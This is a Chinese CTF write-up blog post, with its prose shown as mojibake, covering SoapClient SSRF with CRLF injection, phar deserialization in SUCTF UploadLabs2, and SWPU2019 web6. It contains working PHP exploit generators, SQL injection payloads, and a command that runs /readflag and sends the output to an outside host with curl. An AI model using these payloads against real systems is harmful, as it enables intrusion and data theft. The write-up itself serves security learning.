ä¸ºæˆ‘æ‡’å¾—å†™è‡ªåŠ¨åŒ–è„šæœ¬å§ã€‚çœ‹åˆ°èµµå¸ˆå‚…çš„wpç›´æ¥è‡ªåŠ¨åŒ–ä¸€æŠŠæ¢­ç¾¡æ…•ä¸å·²ã€‚<br>è¿™é¢˜å…¶ä»–ç»†èŠ‚æˆ‘å°±ä¸è®²äº†ï¼Œä¸»è¦é‡ç‚¹è®²è®²ä¸­é—´åˆ©ç”¨Soapçš„éƒ¨åˆ†<br>é¦–å…ˆé¢˜ç›®åœ¨ç™»å½•è¿›å»åæœ‰ä¸ªç‚¹ï¼Œè¿™é‡Œ<code>signature</code>å˜é‡å¯ä»¥æ„é€ ä¸‹æ—¶é—´ç›²æ³¨ã€‚å› ä¸ºåå¼•å·+æ­£åˆ™æ›¿æ¢çš„ä½¿ç”¨ä¸å½“ï¼Œå¯¼è‡´äº†å¯æ³¨çš„åœ°æ–¹ï¼Œäºæ˜¯å¯ä»¥å¾—åˆ°ç®¡ç†å‘˜çš„è´¦å·å¯†ç ã€‚<br>å¤§æ¦‚æ˜¯è¿™ç§å½¢å¼å§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#96; or sleep(3) ,1)#</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å°è¯•ç™»å½•æ—¶å´æç¤ºéœ€è¦ä»æœ¬åœ°ç™»è¿›ï¼Œè¿™å°±æ˜¯è¯´è¦ssrfäº†ã€‚æ€ä¹ˆè¾¾æˆå‘¢?<br>å› ä¸ºæˆ‘ç¯å¢ƒæ‡’å¾—é‡å¼€äº†ï¼Œå€Ÿç”¨ä¸‹å…¶ä»–å¸ˆå‚…çš„å›¾<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è™½ç„¶å°†moodå‚æ•°è½¬intå¹¶addshalshesäº†ï¼Œä½†æ˜¯åé¢moodå‚æ•°åœ¨å¯ä»¥æ³¨å…¥çš„signnatureå‚æ•°åé¢ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ³¨å…¥å°†å…¶ç›´æ¥æ³¨é‡Šæ‰ï¼Œæ¥æ³¨å…¥ä¸€ä¸ªæˆ‘ä»¬çš„æ¶æ„åºåˆ—åŒ–å¯¹è±¡<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>ç„¶åè°ƒç”¨äº†ä¸€ä¸ªgetcountry()æ–¹æ³•ï¼Œç»“åˆæˆ‘ä»¬ä¹‹å‰çš„éœ€æ±‚ï¼Œæ­£å¥½å¯ä»¥ä½¿ç”¨SoapClientã€‚åªè¦ä½¿ç”¨Soapæ„é€ ä¸€ä¸ªç™»é™†adminçš„è¯·æ±‚ï¼Œåºåˆ—åŒ–åæ’å…¥æ•°æ®åº“ï¼Œè¿™é‡Œè°ƒç”¨ä¸å­˜åœ¨æ–¹æ³•æ—¶å°±èƒ½ç›´æ¥è§¦å‘<code>__call()</code>è¿›è€Œè§¦å‘ssrfã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/index.php?action=login"</span>;</span><br><span class="line">$post_string = <span class="string">'username=admin&amp;password=jaivypassword&amp;code=4153792'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=pu1bnms95shhapubhqoh9vk7h2'</span>,</span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'byc^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'^^Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string.<span class="string">'^^'</span>,<span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>));</span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'0x'</span>.bin2hex($aaa);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¨å¾®è§£é‡Šä¸‹è¦ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦çš„æ˜¯ssrfç™»å½•adminï¼Œé‚£ä¹ˆåˆ°æ—¶å€™ååºåˆ—åŒ–è§¦å‘å®Œäº†ï¼Œæˆ‘ä»¬è‡ªå·±ç™»è¿›å»ï¼Œéœ€è¦çš„å°±æ˜¯ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„cookieã€‚<br>åŒæ—¶å› ä¸ºè¦æ„é€ çš„è¯·æ±‚å¿…é¡»æ˜¯ç™»å½•æ—¶åŒ…å«äº†adminçš„è´¦å·å¯†ç ä»¥åŠéªŒè¯ç çš„æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦postè¯·æ±‚ã€‚è¿™é‡Œåˆä¸€æ¬¡ç”¨åˆ°CRLFï¼Œæ¥æ§åˆ¶Content-Typeï¼ŒContent-Length,è¾¾æˆpostè¯·æ±‚çš„æ¡ä»¶ã€‚</p><p>é‚£ä¹ˆæ­¤æ—¶æœ€å¥½é‡å¼€ä¸€ä¸ªæµè§ˆå™¨ï¼Œç›´æ¥ä½¿ç”¨æ–°ç•Œé¢çš„cookieä»¥åŠç®—å¥½çš„éªŒè¯ç æ”¾åˆ°è„šæœ¬ä¸­ï¼Œå¾—åˆ°16è¿›åˆ¶çš„åºåˆ—åŒ–æ•°æ®ã€‚ç„¶ååœ¨å·²ç»ç™»å½•çš„ä½ç½®æ³¨å…¥åºåˆ—åŒ–æ•°æ®ã€‚è¿™æ—¶ä¼šè‡ªåŠ¨è·³åˆ°indexç•Œé¢ï¼Œè§¦å‘åºåˆ—åŒ–ã€‚ï¼ˆæˆ‘ç›´æ¥é‡åˆ°500,ä½†æ˜¯ä¸å½±å“ï¼‰ä¹‹åå†å›åˆ°åŸå…ˆæœªç™»å½•çš„åœ°æ–¹ç™»å½•å°±å¥½äº†ã€‚</p><p>åé¢çš„éƒ¨åˆ†ä¸æäº†ï¼Œæ˜¨å¤©åšäº†æˆ‘ä¸€ä¸‹åˆâ€¦â€¦å¯ä»¥å‚è€ƒèµµå¸ˆå‚…æˆ–è€…å…¶ä»–å¸ˆå‚…çš„wp<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6170.html</a><br><a href="https://blog.csdn.net/chasingin/article/details/104687766" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104687766</a></p><h2 id="SUCTF-UploadLabs2"><a href="#SUCTF-UploadLabs2" class="headerlink" title="SUCTF UploadLabs2"></a>SUCTF UploadLabs2</h2><p>è¿™é¢˜ä¹Ÿæ˜¯ç»™å‡ºæºç ï¼Œç„¶åå®¡è®¡<br>é¦–å…ˆæ˜¯Adç±»ä¸€ä¸ªè¯±äººçš„ææ„æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ¥çœ‹çœ‹è¾¾æˆæ¡ä»¶<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>éœ€è¦ssrfï¼Œä¸ç”¨è¯´è¿™é‡Œåº”è¯¥åˆå¯ä»¥æƒ³åˆ°æˆ‘ä»¬çš„Soapç±»äº†ã€‚<br>ç„¶åçœ‹çœ‹æœ‰æ²¡æœ‰å¯ç”¨çš„æ–¹æ³•ï¼Œå¾ˆå¿«åœ¨Fileç±»ä¸­æ‰¾åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $class = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;func);</span><br><span class="line">    $a = $class-&gt;newInstanceArgs(<span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    $a-&gt;check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒReflectionClassæ˜¯phpä¸­åå°„ç±»çš„æ„æ€ã€‚æ‰€ä»¥å…¶å®wakeupçš„å‰ä¸¤è¡Œå°±æ˜¯æ‰§è¡Œäº†ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡çš„ä½œç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$class &#x3D; new ReflectionClass(&#39;Person&#39;); &#x2F;&#x2F; å»ºç«‹ Personè¿™ä¸ªç±»çš„åå°„ç±»  </span><br><span class="line">$instance  &#x3D; $class-&gt;newInstanceArgs($args); &#x2F;&#x2F; ç›¸å½“äºå®ä¾‹åŒ–Person ç±»</span><br></pre></td></tr></table></figure><p>åŠ ä¸Šé‚£ä¸ª<code>$a-&gt;check();</code>æˆ‘ä»¬åŸºæœ¬ç¡®å®šè¿™é‡Œå°±æ˜¯ç”¨Soapç±»æ¥æ„é€ äº†ã€‚<br>æ¥ä¸‹æ¥è”ç³»func.phpä¸­ä¼ å‚å®ä¾‹åŒ–Fileå¯¹è±¡çš„åšæ³•ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">      $file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">      $file-&gt;getMIME();</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure><p>ä¸éš¾æƒ³åˆ°ä½¿ç”¨pharæ¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¿™æ ·æˆ‘ä»¬çš„Fileç±»åœ¨å®ä¾‹åŒ–åï¼Œè¢«è§¦å‘ååºåˆ—åŒ–ï¼Œè°ƒç”¨<code>__wakeup()</code>ï¼Œåªè¦funcæ˜¯<code>SoapClient</code>å°±èƒ½è¿›è¡Œåç»­çš„ssrfï¼Œè¾¾æˆä»»æ„å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $func=<span class="string">'SoapClient'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=&amp;cmd=curl http://174.1.28.1:8877/?`/readflag`&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name=[</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                <span class="string">'user_agent'</span>=&gt;str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>,<span class="string">'byc^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string.<span class="string">'^^'</span>)</span><br><span class="line">            ,<span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> File();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">@unlink(<span class="string">"1.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"1.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;script language='php'&gt; __HALT_COMPILER(); &lt;/script&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'1.phar'</span>,<span class="string">'1.jpg'</span>);</span><br></pre></td></tr></table></figure><p>åŒæ ·æå‡ ä¸ªç»†èŠ‚ï¼š</p><ul><li>Soapçš„å‚æ•°ä¸­file_nameè¢«è®¾ä¸ºæ•°ç»„æ˜¯åå°„ç±»çš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œå®ƒæ¥æ”¶çš„æ˜¯æ•°ç»„å‚æ•°ã€‚</li><li>pharçš„æ–‡ä»¶åå·²ç»æ”¹æˆjpgäº†ï¼Œä½†æ˜¯ä¸ºäº†è¿‡ä¸€ä¸ªæ–‡ä»¶å¤´çš„æ ¡éªŒè¿˜å¾—è®¾å®š<code>$phar-&gt;setStub(&quot;&lt;script language=&#39;php&#39;&gt; __HALT_COMPILER(); &lt;/script&gt;&quot;);</code></li><li>postæ•°æ®é™¤äº†cmdè·Ÿadminå¤–ï¼Œè¿˜è¦æ³¨æ„Adåœ¨ææ„å‰è°ƒç”¨çš„å¦å¤–ä¸€ä¸ªcheck()æ–¹æ³•ä¸­æ¥æ”¶çš„å‚æ•°ï¼Œä»–ä»¬éƒ½æ˜¯åå°„ç±»å®ä¾‹åŒ–çš„<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€Œæˆ‘ä»¬åªéœ€è¦ä¼ å­˜åœ¨çš„ç±»è·Ÿæ–¹æ³•å³å¯ã€‚æ¯”å¦‚SplStackå°±æ˜¯phpæ ‡å‡†åº“é‡Œæ•°æ®ç»“æ„ç±»ï¼Œpushæ–¹æ³•ä¹Ÿæ˜¯è‡ªç„¶å­˜åœ¨çš„ã€‚<br>æ‰€ä»¥ä¸Šä¼ 1.jpg,åœ¨func.phpè°ƒç”¨<br><code>php://filter/resource=phar://upload/76d9f00467e5ee6abc3ca60892ef304e/f3ccdd27d2000e3f9255a7e3e2c48800.jpg</code>è§¦å‘ååºåˆ—åŒ–ã€‚</li></ul><p><del>è¿™é‡Œæˆ‘å¾€buuçš„requestsbinæ‰“payloadæ²¡æ”¶åˆ°</del>ä¸æ­¢æ²¡æ”¶åˆ°ï¼Œç›´æ¥æ­»åœ¨æ–‡ä»¶æµé‚£äº†ã€‚å®ƒæŠ¥çš„æˆ‘æ–‡ä»¶æ˜¯ost-streamã€‚å‘½ä»¤æ‰§è¡Œå¤±è´¥ã€‚</p><p>ç”¨å®ƒçš„å†…ç½‘é¶æœºå°±æ²¡äº‹ï¼Ÿå¥½å§ï¼Œè¿˜æ˜¯æœ‰flagçš„hhh.<br><img src="/2020/03/18/%E4%BD%BF%E7%94%A8Soap%E7%9A%84ssrf-crlf%E6%94%BB%E5%87%BB/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="SWPU2019-web6"><a href="#SWPU2019-web6" class="headerlink" title="SWPU2019 web6"></a>SWPU2019 web6</h2><p>ä¸Šæ¥ä¸€ä¸ªsqlçš„ä¸‡èƒ½å¯†ç ï¼Œç”¨åˆ°äº†<code>with rollup</code>çš„trick<br>1â€™ or â€˜1â€™=â€™1â€™  group by passwd with rollup having passwd is NULL â€“ -<br>æ·»åŠ ä¸€ä¸ªç©ºåˆ—ï¼Œè¿›è¡Œç»“æœåˆ¤æ–­NULL=false<br>ç»•è¿‡å¼±ç±»å‹ç›¸ç­‰</p><p>è¿›å»åå‘ç°wsdl.phpæä¾›äº†ä¸å°‘æ¥å£ï¼Œå…¶ä¸­ä¸€ä¸ªå¯ä»¥è¯»æ–‡ä»¶<br>æŠŠå¯è¯»çš„æ–‡ä»¶è¯»ä¸€ä¸‹<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">include</span> (<span class="string">"encode.php"</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"Service.php"</span>);</span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//phpinfo();</span></span><br><span class="line"></span><br><span class="line">$method = $_GET[<span class="string">'method'</span>]?$_GET[<span class="string">'method'</span>]:<span class="string">'index'</span>;</span><br><span class="line"><span class="comment">//echo 1231;</span></span><br><span class="line">$allow_method = <span class="keyword">array</span>(<span class="string">"File_read"</span>,<span class="string">"login"</span>,<span class="string">"index"</span>,<span class="string">"hint"</span>,<span class="string">"user"</span>,<span class="string">"get_flag"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!in_array($method,$allow_method))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"not allow method"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($method===<span class="string">"File_read"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $param =$_POST[<span class="string">'filename'</span>];</span><br><span class="line">    $param2=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($method===<span class="string">"login"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $param=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        $param2 = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"method can use"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $method;</span><br><span class="line">$newclass = <span class="keyword">new</span> Service();</span><br><span class="line"><span class="keyword">echo</span> $newclass-&gt;$method($param,$param2);</span><br><span class="line"></span><br><span class="line">ob_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Surface.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'Service.php'</span>);</span><br><span class="line">    $ser = <span class="keyword">new</span> SoapServer(<span class="string">'Service.wsdl'</span>,<span class="keyword">array</span>(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>se.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span>  è°ƒç”¨å‡½æ•°ï¼Œæ˜¾ç„¶å¯è·Ÿè¿›åˆ°<span class="title">invoke</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span>  å…¥æ‰‹ç‚¹ï¼Œæ˜¾ç„¶å¯è·Ÿè¿›åˆ°<span class="title">__call</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1; æ‹¼æ¥,é‚£ä¹ˆæœ‰å­—ç¬¦ä¸²äº†</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span 